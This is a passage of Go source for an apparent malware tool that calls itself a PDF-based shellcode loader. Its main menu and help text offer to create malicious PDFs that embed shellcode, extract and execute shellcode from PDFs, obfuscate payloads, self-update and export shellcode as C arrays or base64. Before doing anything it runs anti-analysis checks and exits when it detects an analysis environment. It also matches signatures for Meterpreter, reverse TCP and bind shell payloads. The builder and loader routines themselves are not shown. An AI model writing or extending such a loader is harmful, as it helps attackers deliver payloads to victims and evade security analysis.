        fmt.Print("\nSelect payload number: ")
        scanner.Scan()
        idx, _ := strconv.Atoi(scanner.Text())
        if idx > 0 && idx <= len(matches) {
            displayFullPayloadDetails(matches[idx-1])
        }
    }
}

func displayFullPayloadDetails(file string) {
    data, err := ioutil.ReadFile(file)
    if err != nil {
        fmt.Printf("[-] Error: %v\n", err)
        return
    }
    
    var payload Payload
    if err := json.Unmarshal(data, &payload); err != nil {
        fmt.Printf("[-] Error: %v\n", err)
        return
    }
    
    fmt.Println("\n" + strings.Repeat("=", 60))
    fmt.Println("PAYLOAD DETAILS")
    fmt.Println(strings.Repeat("=", 60))
    
    // Display metadata
    fmt.Printf("Type:        %s\n", payload.Type)
    fmt.Printf("OS/Arch:     %s/%s\n", payload.OS, payload.Arch)
    fmt.Printf("Timestamp:   %s\n", time.Unix(payload.Timestamp, 0).Format("2006-01-02 15:04:05 MST"))
    fmt.Printf("Checksum:    %s\n", payload.Checksum)
    
    // Try to load shellcode for analysis
    binFile := strings.TrimSuffix(file, ".json") + ".bin"
    if shellcode, err := ioutil.ReadFile(binFile); err == nil {
        fmt.Printf("Size:        %d bytes\n", len(shellcode))
        
        // Analyze shellcode
        fmt.Println("\nShellcode Analysis:")
        fmt.Printf("  First 16 bytes: %s\n", hex.EncodeToString(shellcode[:min(16, len(shellcode))]))
        fmt.Printf("  Last 16 bytes:  %s\n", hex.EncodeToString(shellcode[max(0, len(shellcode)-16):]))
        
        // Detect potential shellcode type
        detectShellcodeType(shellcode)
        
        // Show entropy
        entropy := calculateEntropy(shellcode)
        fmt.Printf("  Entropy:        %.2f bits/byte\n", entropy)
        
        if entropy > 7.5 {
            fmt.Println("  [*] High entropy - likely encrypted/compressed")
        }
    }
    
    fmt.Println(strings.Repeat("=", 60))
}

func detectShellcodeType(shellcode []byte) {
    if len(shellcode) < 4 {
        return
    }
    
    // Common shellcode signatures
    signatures := []struct {
        name string
        sig  []byte
    }{
        {"Windows x64 (common)", []byte{0x48, 0x83, 0xEC}},
        {"Windows x86", []byte{0xFC, 0x55}},
        {"Linux x64", []byte{0x48, 0x31}},
        {"Meterpreter", []byte{0xFC, 0xE8}},
        {"Reverse TCP", []byte{0x6A, 0x00, 0x68}},
        {"Bind Shell", []byte{0x31, 0xC0, 0x50}},
    }
    
    for _, sig := range signatures {
        if bytes.HasPrefix(shellcode, sig.sig) {
            fmt.Printf("  Detected:      %s\n", sig.name)
            return
        }
    }
    
    // Check for PE header (if shellcode includes a PE)
    if bytes.HasPrefix(shellcode, []byte{'M', 'Z'}) {
        fmt.Println("  Detected:      PE executable (MZ header)")
    }
}

func calculateEntropy(data []byte) float64 {
    if len(data) == 0 {
        return 0
    }
    
    freq := make(map[byte]float64)
    for _, b := range data {
        freq[b]++
    }
    
    var entropy float64
    for _, count := range freq {
        p := count / float64(len(data))
        entropy -= p * math.Log2(p)
    }
    
    return entropy
}

func deletePayloadInteractive(scanner *bufio.Scanner) {
    fmt.Print("Enter checksum to delete (or 'all' for all): ")
    scanner.Scan()
    target := scanner.Text()
    
    if strings.ToLower(target) == "all" {
        fmt.Print("Are you sure? (yes/no): ")
        scanner.Scan()
        if strings.ToLower(scanner.Text()) == "yes" {
            files, _ := filepath.Glob(filepath.Join(CacheDir, "*"))
            deleted := 0
            for _, file := range files {
                if err := os.Remove(file); err == nil {
                    deleted++
                }
            }
            fmt.Printf("[+] Deleted %d files\n", deleted)
        }
        return
    }
    
    if err := deleteCachedPayload(target); err != nil {
        fmt.Printf("[-] Error: %v\n", err)
    }
}

func exportPayload(scanner *bufio.Scanner) {
    fmt.Print("Enter checksum to export: ")
    scanner.Scan()
    checksum := scanner.Text()
    
    payload, shellcode, err := loadCachedPayload(checksum)
    if err != nil {
        fmt.Printf("[-] Error: %v\n", err)
        return
    }
    
    fmt.Print("Export format (raw/json/c/b64/hex): ")
    scanner.Scan()
    format := strings.ToLower(scanner.Text())
    
    fmt.Print("Output filename: ")
    scanner.Scan()
    filename := scanner.Text()
    
    switch format {
    case "raw":
        err = ioutil.WriteFile(filename, shellcode, 0644)
    case "json":
        data, _ := json.MarshalIndent(payload, "", "  ")
        err = ioutil.WriteFile(filename, data, 0644)
    case "c":
        exportAsC(shellcode, filename)
    case "b64":
        b64 := base64.StdEncoding.EncodeToString(shellcode)
        err = ioutil.WriteFile(filename, []byte(b64), 0644)
    case "hex":
        hexStr := hex.EncodeToString(shellcode)
        err = ioutil.WriteFile(filename, []byte(hexStr), 0644)
    default:
        fmt.Println("[-] Invalid format")
        return
    }
    
    if err != nil {
        fmt.Printf("[-] Export failed: %v\n", err)
    } else {
        fmt.Printf("[+] Exported to %s\n", filename)
    }
}

func exportAsC(shellcode []byte, filename string) error {
    var buf bytes.Buffer
    buf.WriteString("unsigned char shellcode[] = {\n    ")
    
    for i, b := range shellcode {
        buf.WriteString(fmt.Sprintf("0x%02x", b))
        if i < len(shellcode)-1 {
            buf.WriteString(", ")
            if (i+1) % 12 == 0 {
                buf.WriteString("\n    ")
            }
        }
    }
    
    buf.WriteString("\n};\n")
    buf.WriteString(fmt.Sprintf("unsigned int shellcode_len = %d;\n", len(shellcode)))
    
    return ioutil.WriteFile(filename, buf.Bytes(), 0644)
}

func clearAllPayloads(scanner *bufio.Scanner) {
    fmt.Print("WARNING: This will delete ALL cached payloads. Continue? (yes/no): ")
    scanner.Scan()
    if strings.ToLower(scanner.Text()) != "yes" {
        fmt.Println("[-] Operation cancelled")
        return
    }
    
    files, err := filepath.Glob(filepath.Join(CacheDir, "*"))
    if err != nil {
        fmt.Printf("[-] Error: %v\n", err)
        return
    }
    
    deleted := 0
    for _, file := range files {
        if err := os.Remove(file); err == nil {
            deleted++
        }
    }
    
    fmt.Printf("[+] Deleted %d cached payloads\n", deleted)
}

//  main function to include interactive mode
func main() {
    if !antiAnalysisChecks() {
        fmt.Println("[!] Analysis environment detected, exiting...")
        os.Exit(0)
    }
    
    // Check command line arguments
    if len(os.Args) < 2 {
        printHelp()
        os.Exit(1)
    }
    
    command := os.Args[1]
    
    switch command {
    case "extract":
        if len(os.Args) < 3 {
            fmt.Println("Usage: loader extract <pdf_file>")
            os.Exit(1)
        }
        extractAndExecute(os.Args[2])
        
    case "create":
        if len(os.Args) < 5 {
            fmt.Println("Usage: loader create <shellcode_file> <output_pdf> <template_pdf>")
            os.Exit(1)
        }
        createMaliciousPDF(os.Args[2], os.Args[3], os.Args[4])
        
    case "obfuscate":
        if len(os.Args) < 4 {
            fmt.Println("Usage: loader obfuscate <input_file> <output_file>")
            os.Exit(1)
        }
        obfuscateShellcodeFile(os.Args[2], os.Args[3])
        
    case "deobfuscate":
        if len(os.Args) < 4 {
            fmt.Println("Usage: loader deobfuscate <input_file> <output_file>")
            os.Args = append(os.Args, "")
        }
        deobfuscateShellcodeFile(os.Args[2], os.Args[3])
        
    case "update":
        forceUpdate()
        
    case "scan":
        if len(os.Args) < 3 {
            fmt.Println("Usage: loader scan <pdf_file>")
            os.Exit(1)
        }
        scanPDF(os.Args[2])
        
    case "list":
        listPayloads()
        
    case "manage":
        interactivePayloadManagement()
        
    case "clean":
        cleanCache()
        
    case "version":
        fmt.Printf("Shellcode Loader v%s\n", Version)
        
    case "interactive":
        runInteractiveMode()
        
    default:
        printHelp()
    }
}

func runInteractiveMode() {
    scanner := bufio.NewScanner(os.Stdin)
    
    fmt.Println("\n" + strings.Repeat("=", 60))
    fmt.Println("  SHELLCODE LOADER INTERACTIVE MODE v" + Version)
    fmt.Println(strings.Repeat("=", 60))
    
    for {
        fmt.Println("\n[+] Main Menu:")
        fmt.Println("  1. Extract & Execute from PDF")
        fmt.Println("  2. Create Malicious PDF")
        fmt.Println("  3. Payload Management")
        fmt.Println("  4. Scan PDF")
        fmt.Println("  5. Obfuscate Shellcode")
        fmt.Println("  6. Check for Updates")
        fmt.Println("  7. System Info")
        fmt.Println("  8. Clean Cache")
        fmt.Println("  9. Exit")
        fmt.Print("\nSelect option: ")
        
        scanner.Scan()
        choice := scanner.Text()
        
        switch choice {
        case "1":
            fmt.Print("Enter PDF path: ")
            scanner.Scan()
            extractAndExecute(scanner.Text())
        case "2":
            fmt.Print("Shellcode file: ")
            scanner.Scan()
            scFile := scanner.Text()
            fmt.Print("Output PDF: ")
            scanner.Scan()
            outPDF := scanner.Text()
            fmt.Print("Template PDF (optional): ")
            scanner.Scan()
            tmplPDF := scanner.Text()
            createMaliciousPDF(scFile, outPDF, tmplPDF)
        case "3":
            interactivePayloadManagement()
        case "4":
            fmt.Print("PDF to scan: ")
            scanner.Scan()
            scanPDF(scanner.Text())
        case "5":
            fmt.Print("Input file: ")
            scanner.Scan()
            inFile := scanner.Text()
            fmt.Print("Output file: ")
            scanner.Scan()
            outFile := scanner.Text()
            obfuscateShellcodeFile(inFile, outFile)
        case "6":
            forceUpdate()
        case "7":
            showSystemInfo()
        case "8":
            cleanCache()
        case "9":
            fmt.Println("[+] Exiting...")
            return
        default:
            fmt.Println("[-] Invalid choice")
        }
    }
}

func showSystemInfo() {
    fmt.Println("\n[+] System Information:")
    fmt.Printf("  OS:              %s\n", runtime.GOOS)
    fmt.Printf("  Architecture:    %s\n", runtime.GOARCH)
    fmt.Printf("  CPUs:            %d\n", runtime.NumCPU())
    fmt.Printf("  Go Version:      %s\n", runtime.Version())
    
    // Memory info
    var mem runtime.MemStats
    runtime.ReadMemStats(&mem)
    fmt.Printf("  Memory Used:     %s\n", formatBytes(int64(mem.Alloc)))
    fmt.Printf("  Total Memory:    %s\n", formatBytes(int64(mem.Sys)))
    
    // Cache info
    if info, err := os.Stat(CacheDir); err == nil {
        fmt.Printf("  Cache Location: %s\n", CacheDir)
        fmt.Printf("  Cache Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05"))
    }
    
    // Config info
    fmt.Printf("  Auto Update:     %v\n", config.AutoUpdate)
    fmt.Printf("  Obfuscation:     %v\n", config.UseObfuscation)
    fmt.Printf("  Anti-Analysis:   %v\n", config.AntiAnalysis)
}

// Add missing min/max helper functions
func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

func max(a, b int) int {
    if a > b {
        return a
    }
    return b
}

// Update printHelp to include new commands
func printHelp() {
    fmt.Println(`Shellcode Loader v` + Version + `
Advanced PDF-based shellcode loader with self-updating capabilities

COMMANDS:
  extract <pdf>          Extract and execute shellcode from PDF
  create <sc> <out> <tmpl> Create malicious PDF with shellcode
  obfuscate <in> <out>   Obfuscate shellcode file
  deobfuscate <in> <out> Deobfuscate shellcode file
  update                 Force update check and apply
  scan <pdf>             Scan PDF for malicious content
  list                   List cached payloads
  manage                 Interactive payload management
  clean                  Clean cache directory
  version                Show version
  interactive            Launch interactive mode

EXAMPLES:
  loader extract malicious.pdf
  loader create shellcode.bin output.pdf template.pdf
  loader scan suspicious.pdf
  loader update
  loader manage

PAYLOAD MANAGEMENT:
  - View detailed payload information
  - Delete specific or all payloads
  - Export in multiple formats (raw, JSON, C, base64, hex)
  - Automatic cleanup of old payloads

CONFIGURATION:
  Edit ` + ConfigFile + ` to customize behavior
  Enable/disable anti-analysis, obfuscation, auto-update

SECURITY:
  Use only in authorized environments
  Keep configuration secure
  Monitor network traffic`)
}
